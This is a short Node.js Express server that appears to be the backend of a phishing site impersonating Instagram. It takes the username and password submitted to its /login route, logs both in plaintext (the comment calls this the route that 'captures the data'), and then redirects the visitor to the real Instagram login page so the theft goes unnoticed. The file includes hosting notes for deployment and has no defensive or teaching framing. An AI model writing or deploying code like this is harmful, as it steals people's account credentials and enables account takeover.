const express = require('express');
const path = require('path');
const app = express();

// Render assigns a port automatically; we default to 3000 for local testing
const PORT = process.env.PORT || 3000; 

// Middleware to tell the server where to find your HTML, CSS, and images
app.use(express.static(path.join(__dirname, 'public')));

// Middleware to parse form data (username and password)
app.use(express.urlencoded({ extended: true }));

// **CRITICAL: The Route that Captures the Data**
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    console.log(`--- New Login Attempt ---`);
    console.log(`Username: ${username}`);
    console.log(`Password: ${password}`);
    console.log(`-------------------------`);
    res.redirect('https://www.instagram.com/accounts/login/'); 
});

// Start the server listening
app.listen(PORT, () => {
    console.log(`Server running successfully on port ${PORT}`);
});